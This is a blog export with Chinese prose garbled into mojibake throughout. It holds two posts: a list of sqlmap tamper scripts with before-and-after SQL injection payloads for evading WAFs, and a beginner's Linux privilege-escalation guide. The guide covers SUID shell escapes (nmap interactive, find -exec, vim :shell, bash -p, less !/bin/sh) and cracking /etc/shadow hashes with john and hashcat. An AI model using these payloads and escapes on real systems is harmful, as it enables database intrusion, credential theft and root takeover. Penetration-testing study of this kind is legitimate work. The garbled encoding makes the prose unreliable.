<p>space2plus.py<br>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šç”¨åŠ å·æ›¿æ¢ç©ºæ ¼<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)<br>ä½¿ç”¨è„šæœ¬åï¼šSELECT+id+FROM+users</p>
<p>nonrecursivereplacement.py<br>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šä½œä¸ºåŒé‡æŸ¥è¯¢è¯­å¥ï¼Œç”¨åŒé‡è¯­å¥æ›¿ä»£é¢„å®šä¹‰çš„sqlå…³é”®å­—ï¼ˆé€‚ç”¨äºéå¸¸å¼±çš„è‡ªå®šä¹‰è¿‡æ»¤å™¨ï¼Œä¾‹å¦‚å°†selectæ›¿æ¢ä¸ºç©ºï¼‰<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 UNION SELECT 2â€“â€™)<br>ä½¿ç”¨è„šæœ¬åï¼š1 UNIOUNIONN SELESELECTCT 2â€“</p>
<p>space2randomblank.py<br>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºå…¶ä»–æœ‰æ•ˆå­—ç¬¦<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)<br>ä½¿ç”¨è„šæœ¬åï¼šSELECT%0Did%0DFROM%0Ausers</p>
<p>unionalltounion.py<br>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šå°†union allselect æ›¿æ¢ä¸ºunionselect<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜-1 UNION ALL SELECTâ€™)<br>ä½¿ç”¨è„šæœ¬åï¼š-1 UNION SELECT</p>
<p>securesphere.py<br>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šè¿½åŠ ç‰¹å®šçš„å­—ç¬¦ä¸²<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 1&#x3D;1â€™)<br>ä½¿ç”¨è„šæœ¬åï¼š1 AND 1&#x3D;1 and â€˜0havingâ€™&#x3D;â€™0havingâ€™</p>
<p>space2dash.py<br>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºâ€“ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227&#x3D;9227â€™)<br>ä½¿ç”¨è„šæœ¬åï¼š1â€“nVNaVoPYeva%0AANDâ€“ngNvzqu%0A9227&#x3D;9227</p>
<p>space2mssqlblank.py<br>é€‚ç”¨æ•°æ®åº“ï¼šMicrosoft SQL Server<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000ã€Microsoft SQL Server 2005<br>ä½œç”¨ï¼šå°†ç©ºæ ¼éšæœºæ›¿æ¢ä¸ºå…¶ä»–ç©ºæ ¼ç¬¦å·(â€˜%01â€™, â€˜%02â€™, â€˜%03â€™, â€˜%04â€™, â€˜%05â€™, â€˜%06â€™, â€˜%07â€™, â€˜%08â€™, â€˜%09â€™, â€˜%0Bâ€™, â€˜%0Câ€™, â€˜%0Dâ€™, â€˜%0Eâ€™, â€˜%0Fâ€™, â€˜%0Aâ€™)<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)<br>ä½¿ç”¨è„šæœ¬åï¼šSELECT%0Eid%0DFROM%07users</p>
<p>between.py<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0<br>ä½œç”¨ï¼šç”¨NOT BETWEEN 0 AND #æ›¿æ¢&gt;<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND A &gt; Bâ€“â€™)<br>ä½¿ç”¨è„šæœ¬åï¼š1 AND A NOT BETWEEN 0 AND Bâ€“</p>
<p>percentage.py<br>é€‚ç”¨æ•°æ®åº“ï¼šASP<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000, 2005ã€MySQL 5.1.56, 5.5.11ã€PostgreSQL 9.0<br>ä½œç”¨ï¼šåœ¨æ¯ä¸ªå­—ç¬¦å‰æ·»åŠ ä¸€ä¸ª%<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD FROM TABLEâ€™)<br>ä½¿ç”¨è„šæœ¬åï¼š%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p>
<p>sp_password.py<br>é€‚ç”¨æ•°æ®åº“ï¼šMSSQL<br>ä½œç”¨ï¼šä»T-SQLæ—¥å¿—çš„è‡ªåŠ¨è¿·ç³Šå¤„ç†çš„æœ‰æ•ˆè½½è·ä¸­è¿½åŠ sp_password<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227&#x3D;9227â€“ â€˜)<br>ä½¿ç”¨è„šæœ¬åï¼š1 AND 9227&#x3D;9227â€“ sp_password</p>
<p>charencode.py<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0<br>ä½œç”¨ï¼šå¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨urlç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD FROM%20TABLEâ€™)<br>ä½¿ç”¨è„šæœ¬åï¼š%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p>
<p>randomcase.py<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0<br>ä½œç”¨ï¼šéšæœºå¤§å°å†™<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜INSERTâ€™)<br>ä½¿ç”¨è„šæœ¬åï¼šINseRt</p>
<p>charunicodeencode.py<br>é€‚ç”¨æ•°æ®åº“ï¼šASPã€ASP.NET<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000&#x2F;2005ã€MySQL 5.1.56ã€PostgreSQL 9.0.3<br>ä½œç”¨ï¼šé€‚ç”¨å­—ç¬¦ä¸²çš„unicodeç¼–ç <br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD%20FROM TABLEâ€™)<br>ä½¿ç”¨è„šæœ¬åï¼š%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p>
<p>space2comment.py<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0<br>ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º&#x2F;<strong>&#x2F;<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)<br>ä½¿ç”¨è„šæœ¬åï¼šSELECT&#x2F;</strong>&#x2F;id&#x2F;<strong>&#x2F;FROM&#x2F;</strong>&#x2F;users</p>
<p>equaltolike.py<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5<br>ä½œç”¨ï¼šå°†&#x3D;æ›¿æ¢ä¸ºLIKE<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT * FROM users WHERE id&#x3D;1â€™)<br>ä½¿ç”¨è„šæœ¬åï¼šSELECT * FROM users WHERE id LIKE 1</p>
<p>equaltolike.py<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0<br>ä½œç”¨ï¼šå°†&gt;æ›¿æ¢ä¸ºGREATESTï¼Œç»•è¿‡å¯¹&gt;çš„è¿‡æ»¤<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND A &gt; Bâ€™)<br>ä½¿ç”¨è„šæœ¬åï¼š1 AND GREATEST(A,B+1)&#x3D;A</p>
<p>ifnull2ifisnull.py<br>é€‚ç”¨æ•°æ®åº“ï¼šMySQLã€SQLite (possibly)ã€SAP MaxDB (possibly)<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0 and 5.5<br>ä½œç”¨ï¼šå°†ç±»ä¼¼äºIFNULL(A, B)æ›¿æ¢ä¸ºIF(ISNULL(A), B, A)ï¼Œç»•è¿‡å¯¹IFNULLçš„è¿‡æ»¤<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜IFNULL(1, 2)â€™)<br>ä½¿ç”¨è„šæœ¬åï¼šIF(ISNULL(1),2,1)</p>
<p>modsecurityversioned.py<br>é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0<br>ä½œç”¨ï¼šè¿‡æ»¤ç©ºæ ¼ï¼Œä½¿ç”¨mysqlå†…è”æ³¨é‡Šçš„æ–¹å¼è¿›è¡Œæ³¨å…¥<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 2&gt;1â€“â€™)<br>ä½¿ç”¨è„šæœ¬åï¼š1 &#x2F;<em>!30874AND 2&gt;1</em>&#x2F;â€“</p>
<p>space2mysqlblank.py<br>é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1<br>ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºå…¶ä»–ç©ºæ ¼ç¬¦å·(â€˜%09â€™, â€˜%0Aâ€™, â€˜%0Câ€™, â€˜%0Dâ€™, â€˜%0Bâ€™)<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)<br>ä½¿ç”¨è„šæœ¬åï¼šSELECT%0Bid%0DFROM%0Cusers</p>
<p>modsecurityzeroversioned.py<br>é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0<br>ä½œç”¨ï¼šä½¿ç”¨å†…è”æ³¨é‡Šæ–¹å¼ï¼ˆ&#x2F;<em>!00000</em>&#x2F;ï¼‰è¿›è¡Œæ³¨å…¥<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 2&gt;1â€“â€™)<br>ä½¿ç”¨è„šæœ¬åï¼š1 &#x2F;<em>!00000AND 2&gt;1</em>&#x2F;â€“</p>
<p>space2mysqldash.py<br>é€‚ç”¨æ•°æ®åº“ï¼šMySQLã€MSSQL<br>ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º â€“ ï¼Œå¹¶è¿½éšä¸€ä¸ªæ¢è¡Œç¬¦<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227&#x3D;9227â€™)<br>ä½¿ç”¨è„šæœ¬åï¼š1â€“%0AANDâ€“%0A9227&#x3D;9227</p>
<p>bluecoat.py<br>é€‚ç”¨æ•°æ®åº“ï¼šBlue Coat SGOS<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1,ã€SGOS<br>ä½œç”¨ï¼šåœ¨sqlè¯­å¥ä¹‹åç”¨æœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦ï¼Œéšåç”¨LIKEæ›¿æ¢&#x3D;<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM users where id &#x3D; 1â€™)<br>ä½¿ç”¨è„šæœ¬åï¼šSELECT%09id FROM users where id LIKE 1</p>
<p>versionedkeywords.py<br>é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4.0.18, 5.1.56, 5.5.11<br>ä½œç”¨ï¼šæ³¨é‡Šç»•è¿‡<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#â€™)<br>ä½¿ç”¨è„šæœ¬åï¼š1&#x2F;<em>!UNION</em>&#x2F;&#x2F;<em>!ALL</em>&#x2F;&#x2F;<em>!SELECT</em>&#x2F;&#x2F;<em>!NULL</em>&#x2F;,&#x2F;<em>!NULL</em>&#x2F;, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()&#x2F;<em>!AS</em>&#x2F;&#x2F;<em>!CHAR</em>&#x2F;),CHAR(32)),CHAR(58,100,114,117,58))#</p>
<p>halfversionedmorekeywords.py<br>é€‚ç”¨æ•°æ®åº“ï¼šMySQL &lt; 5.1<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4.0.18&#x2F;5.0.22<br>ä½œç”¨ï¼šåœ¨æ¯ä¸ªå…³é”®å­—å‰æ·»åŠ mysqlç‰ˆæœ¬æ³¨é‡Š<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œvalueâ€™ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND â€˜QDWaâ€™&#x3D;â€™QDWaâ€)<br>ä½¿ç”¨è„šæœ¬åï¼švalueâ€™&#x2F;<em>!0UNION&#x2F;</em>!0ALL&#x2F;<em>!0SELECT&#x2F;</em>!0CONCAT(&#x2F;<em>!0CHAR(58,107,112,113,58),&#x2F;</em>!0IFNULL(CAST(&#x2F;<em>!0CURRENT_USER()&#x2F;</em>!0AS&#x2F;<em>!0CHAR),&#x2F;</em>!0CHAR(32)),&#x2F;<em>!0CHAR(58,97,110,121,58)),&#x2F;</em>!0NULL,&#x2F;<em>!0NULL#&#x2F;</em>!0AND â€˜QDWaâ€™&#x3D;â€™QDWa</p>
<p>space2morehash.py<br>é€‚ç”¨æ•°æ®åº“ï¼šMySQL &gt;&#x3D; 5.1.13<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1.41<br>ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º#ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227&#x3D;9227â€™)<br>ä½¿ç”¨è„šæœ¬åï¼š1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227&#x3D;9227</p>
<p>apostrophenullencode.py<br>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šç”¨éæ³•åŒå­—èŠ‚Unicodeå­—ç¬¦æ›¿æ¢å•å¼•å·<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1 AND â€˜1â€™&#x3D;â€™1â€)<br>ä½¿ç”¨è„šæœ¬åï¼š1 AND %00%271%00%27&#x3D;%00%271</p>
<p>appendnullbyte.py<br>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šåœ¨æœ‰æ•ˆè½½è·çš„ç»“æŸä½ç½®åŠ è½½nullå­—èŠ‚å­—ç¬¦ç¼–ç <br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 1&#x3D;1â€™)<br>ä½¿ç”¨è„šæœ¬åï¼š1 AND 1&#x3D;1%00</p>
<p>chardoubleencode.py<br>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šå¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨åŒé‡urlç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD FROM%20TABLEâ€™)<br>ä½¿ç”¨è„šæœ¬åï¼š%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</p>
<p>unmagicquotes.py<br>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šç”¨ä¸€ä¸ªå¤šå­—èŠ‚ç»„åˆ%bf%27å’Œæœ«å°¾é€šç”¨æ³¨é‡Šä¸€èµ·æ›¿æ¢ç©ºæ ¼<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1â€™ AND 1&#x3D;1â€)<br>ä½¿ç”¨è„šæœ¬åï¼š1%bf%27 AND 1&#x3D;1â€“</p>
<p>randomcomments.py<br>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šç”¨æ³¨é‡Šç¬¦åˆ†å‰²sqlå…³é”®å­—<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜INSERTâ€™)<br>ä½¿ç”¨è„šæœ¬åï¼šI&#x2F;<strong>&#x2F;N&#x2F;</strong>&#x2F;SERT</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>linuxææƒä¹‹æ–°æ‰‹æŒ‡å—</title>
    <url>//posts/linux%E6%8F%90%E6%9D%83%E4%B9%8B%E6%96%B0%E6%89%8B%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<p>è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯ç»™è‡ªå·±åšä¸ªç¬”è®°ï¼Œæ–¹ä¾¿ææƒæ—¶æŸ¥æ‰¾æ¼æ‰ä¸€äº›ä¸œè¥¿ï¼Œç„¶åæœ¬äººä¹Ÿæ˜¯å¼€å§‹å­¦ä¹ ææƒçš„æ€è·¯å’Œè¿‡ç¨‹ï¼Œå¹¶æ²¡æœ‰å¤ªå¤šçš„éªšå§¿åŠ¿åˆ†äº«ç»™å¤§å®¶ï¼Œæ‰€ä»¥æœ¬æ–‡é€‚åˆå°ç™½å§ã€‚</p>
<h4 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="comment">#æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">uname</span> -a </span><br><span class="line"><span class="comment">#Linux - å†…æ ¸å</span></span><br><span class="line"><span class="comment">#audit - ä¸»æœºå</span></span><br><span class="line"><span class="comment">#2.6.18-128.el5 - å†…æ ¸ç‰ˆæœ¬</span></span><br><span class="line"><span class="comment">#1 SMP Wed Jan 21 10:41:14 ....2009 - å†…æ ¸ç¼–è¯‘æ—¥æœŸ</span></span><br><span class="line"><span class="comment">#x86_64 - æ“ä½œç³»ç»Ÿç‰ˆæœ¬</span></span><br><span class="line"><span class="comment">#x86_64 - å¤„ç†å™¨ç±»å‹</span></span><br><span class="line"><span class="comment">#x86_64 - ç¡¬ä»¶å¹³å°</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸¾ä¸ªä¾‹å­ï¼š</span></span><br><span class="line">4.4.0-161-generic  </span><br><span class="line"><span class="comment">#ä¸»ç‰ˆæœ¬.æ¬¡ç‰ˆæœ¬.é‡Šå‡ºç‰ˆæœ¬-ä¿®æ”¹ç‰ˆæœ¬</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line"><span class="comment">#åŒ uname -açš„ä½œç”¨</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h4 id="searchsploitçš„ä½¿ç”¨"><a href="#searchsploitçš„ä½¿ç”¨" class="headerlink" title="searchsploitçš„ä½¿ç”¨"></a>searchsploitçš„ä½¿ç”¨</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ä¾‹å­å¦‚ä¸‹ï¼Œè‡ªå·±å»å­¦å‚æ•°è¯­æ³•ï¼Œä¸è¿‡ä¸€èˆ¬ä¸‹é¢è¿™å‡ å¥å°±å¤Ÿäº†</span></span><br><span class="line">searchsploit linux priv esc 4.4 ubuntu 16  <span class="comment">#priv esc æ˜¯ä¸ºäº†åŒ¹é…Privilege Escalation å³ææƒ </span></span><br><span class="line">//4.4.0 ubuntu 14</span><br><span class="line"><span class="comment">#ä½¿ç”¨--exclude=é€‰é¡¹åˆ é™¤ä¸æƒ³è¦çš„ç»“æœ</span></span><br><span class="line">searchsploit smb windows remote --exclude=<span class="string">&quot;(POC)|txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æœç´¢åŒ…å«abcdçš„æ¼æ´æ ‡é¢˜ï¼Œé»˜è®¤ä¸åŠ å‚æ•°å³ -t å‚æ•° ç©ºæ ¼éš”å¼€å°±çŠ¹å¦‚ç™¾åº¦æœç´¢çš„ç©ºæ ¼éš”å¼€</span></span><br><span class="line">searchsploit -t abcd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="suidææƒ"><a href="#suidææƒ" class="headerlink" title="suidææƒ"></a>suidææƒ</h4><p>ä¸€èˆ¬æœåŠ¡å™¨ä¸ä¼šå®‰è£…ä¹±ä¸ƒå…«ç³Ÿçš„å…¶ä»–åº”ç”¨ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸ä¼šæœ‰suidææƒï¼Œä½†æ˜¯ä¹Ÿä¸å¯æ‰ä»¥è½»å¿ƒã€‚å› ä¸ºææƒå°±æ˜¯è¦æœé›†ä¿¡æ¯ï¼Œæƒ³å°½ä¸€åˆ‡åŠæ³•ã€‚<br>å¸¸è§å¯ç”¨äºsuidææƒçš„å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap</span><br><span class="line"></span><br><span class="line">Vim</span><br><span class="line"></span><br><span class="line">find</span><br><span class="line"></span><br><span class="line">Bash</span><br><span class="line"></span><br><span class="line">More</span><br><span class="line"></span><br><span class="line">Less</span><br><span class="line"></span><br><span class="line">Nano</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span></span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢ä¸€ä¸€ä»‹ç»å„ä¸ªå·¥å…·çš„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ä¾‹å­ã€‚</p>
<p>æŸ¥æ‰¾ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŸ¥æ‰¾rootæƒé™çš„suidå¯æ‰§è¡Œæ–‡ä»¶</span></span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p><strong>ææƒç¤ºä¾‹</strong><br><strong>nmap</strong><br>è€ç‰ˆçš„nmap(2.02-5.21)æœ‰ç›¸äº’çš„åŠŸèƒ½â€“interactive</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p><strong>msfä¸­ä¹Ÿæœ‰ç›¸å…³çš„æ¨¡å—</strong><br>exploit&#x2F;unix&#x2F;local&#x2F;setuid_nmap<br>find<br>å¦‚æœfindä»¥SUIDæƒé™è¿è¡Œï¼Œæ‰€æœ‰é€šè¿‡findæ‰§è¡Œçš„å‘½ä»¤éƒ½ä¼šä»¥rootæƒé™è¿è¡Œã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> <span class="built_in">test</span></span><br><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br><span class="line">vim</span><br></pre></td></tr></table></figure>
<p><strong>vim</strong><br>å¦‚æœvimä»¥SUIDè¿è¡Œï¼Œå°±ä¼šç»§æ‰¿rootç”¨æˆ·çš„æƒé™ï¼Œå¯ä»¥è¯»å–ç³»ç»Ÿä¸­æ‰€æœ‰çš„æ–‡ä»¶</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">vim</span>/<span class="keyword">vi</span></span><br><span class="line">:<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
<p><strong>bash</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -p</span><br><span class="line">&gt;<span class="comment"># id</span></span><br></pre></td></tr></table></figure>
<p><strong>less&#x2F;more</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">less <span class="regexp">/etc/</span>passwd</span><br><span class="line">!<span class="regexp">/bin/</span>sh</span><br></pre></td></tr></table></figure>

<h4 id="æš´åŠ›ç ´è§£"><a href="#æš´åŠ›ç ´è§£" class="headerlink" title="æš´åŠ›ç ´è§£"></a>æš´åŠ›ç ´è§£</h4><p>æœ‰æ—¶å€™å¯†ç ç®€å•çš„æ—¶å€™ä¹Ÿå¯ä»¥è¿›è¡Œæš´åŠ›ç ´è§£ï¼Œä½†æ˜¯å±€é™æ€§ä¹Ÿæ˜¯æœ‰çš„ rootæ‰èƒ½è¯»å–shadowï¼Œä½†æ˜¯æœ‰æ—¶å€™ç½‘ç«™é…ç½®ä¸å½“æˆ‘ä»¬å¯ä»¥è¯»å–æˆ–è€…ç½‘ç«™çš„ä¸€äº›æ•æ„Ÿçš„ä¿¡æ¯æ³„éœ²ã€‚</p>
<p>æš´åŠ›ç ´è§£</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># john åˆ©ç”¨é»˜è®¤å­—å…¸çˆ†ç ´ï¼Œè¿™é‡Œçš„shadowæ”¾ç½®hashå³å¯ä¹Ÿå¯å†™å…¥å®Œæ•´/etc/shadowå†…å®¹</span></span><br><span class="line">john --wordlist=/usr/share/john/password.lst ./shadow</span><br><span class="line"><span class="comment">#æ‰§è¡Œå®Œæ¯•åæŸ¥çœ‹ç ´è§£å‡ºçš„æ˜æ–‡å¯†ç </span></span><br><span class="line">john --show ./shadow</span><br><span class="line"></span><br><span class="line"><span class="comment">#hashcat è¿™é‡Œçš„shadowæ”¾ç½®å®Œå–„çš„hashå³å¯</span></span><br><span class="line">hashcat -m 1800 -o found1.txt --remove shadow /usr/share/john/password.lst </span><br><span class="line"><span class="comment">#æ­¤å¤„éœ€è¦æŠŠlinux å¯†ç çš„hashæå–å‡ºæ¥æ”¾åˆ°ä¸€ä¸ªæ–‡æ¡£é‡ ç„¶åæŸ¥çœ‹è¾“å‡º found1.txtå³å¯</span></span><br></pre></td></tr></table></figure>

<h4 id="mimipenguin"><a href="#mimipenguin" class="headerlink" title="mimipenguin"></a>mimipenguin</h4><p>å’Œmimikatz ä¸€æ · ä»å†…å­˜è¯»å–å¯†ç ï¼Œä½†æ˜¯ä¹Ÿæ˜¯éœ€è¦å¾ˆé«˜çš„æƒé™ï¼Œå¾ˆå°‘ç”¨ã€‚</p>
<h4 id="è®¡åˆ’ä»»åŠ¡-cron"><a href="#è®¡åˆ’ä»»åŠ¡-cron" class="headerlink" title="è®¡åˆ’ä»»åŠ¡ - cron"></a>è®¡åˆ’ä»»åŠ¡ - cron</h4><p>ç³»ç»Ÿå†…å¯èƒ½ä¼šæœ‰ä¸€äº›å®šæ—¶æ‰§è¡Œçš„ä»»åŠ¡ï¼Œä¸€èˆ¬è¿™äº›ä»»åŠ¡ç”±crontabæ¥ç®¡ç†ï¼Œå…·æœ‰æ‰€å±ç”¨æˆ·çš„æƒé™ã€‚érootæƒé™çš„ç”¨æˆ·æ˜¯ä¸å¯ä»¥åˆ—å‡ºrootç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡çš„ã€‚ä½†æ˜¯&#x2F;etc&#x2F;å†…ç³»ç»Ÿçš„è®¡åˆ’ä»»åŠ¡å¯ä»¥è¢«åˆ—å‡º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /etc/cron*</span><br></pre></td></tr></table></figure>
